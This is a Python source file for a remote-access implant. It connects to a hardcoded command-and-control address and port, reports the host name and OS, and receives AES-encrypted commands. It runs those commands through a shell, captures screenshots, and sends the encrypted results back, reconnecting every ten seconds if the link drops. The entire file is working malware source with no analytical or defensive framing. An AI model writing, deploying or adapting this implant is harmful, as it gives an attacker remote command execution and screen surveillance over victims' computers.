import socket
import platform
import mss
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
from PIL import Image
import io
import time
import subprocess

SECRET_KEY = b'0123456789abcdef0123456789abcdef'
C2_SERVER_IP = "192.168.1.20"
C2_SERVER_PORT = 9090

def get_system_info():
    username = platform.node()
    os_version = platform.system() + " " + platform.release()
    return f"{username}|{os_version}"

def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        buffer = io.BytesIO()
        img.save(buffer, format='PNG')

        encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")
        return "[screenshot]" + encoded

def encrypt_message(message: str) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted)

def decrypt_message(encrypted_message: bytes) -> str:
    try:
        raw = base64.b64decode(encrypted_message)
        iv = raw[:16]
        encrypted = raw[16:]
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return decrypted.decode()
    except Exception as e:
        return f"[!] Error decrypting message: {e}"


def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip() if result.stdout.strip() else result.stderr.strip()
    except subprocess.CalledProcessError as e:
        return f"Error ejecutando el comando: {e}"
    except Exception as e:
        return f"Error inesperado: {e}"

def connect_to_c2():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((C2_SERVER_IP, C2_SERVER_PORT))
            system_info = get_system_info()
            client.send(system_info.encode("utf-8"))
            
            while True:
                encrypted_command = client.recv(4096)
                if not encrypted_command:
                    continue

                try:
                    command = decrypt_message(encrypted_command).strip()
                except Exception as e:
                    print(f"[!] Error decrypting the command: {e}")
                    continue

                if command.lower() == "exit":
                    break
                elif command.lower() == "screenshot":
                    output = take_screenshot()
                else:
                    output = execute_command(command)

                if not output:
                    output = "[Sin respuesta]"

                encrypted_output = encrypt_message(output)
                size = str(len(encrypted_output)).zfill(10).encode("utf-8")
                client.send(size + encrypted_output)


        except Exception as e:
            print(f"[!] Error de conexión: {e}, reintentando en 10s...")
            time.sleep(10)


if __name__ == "__main__":
    connect_to_c2()
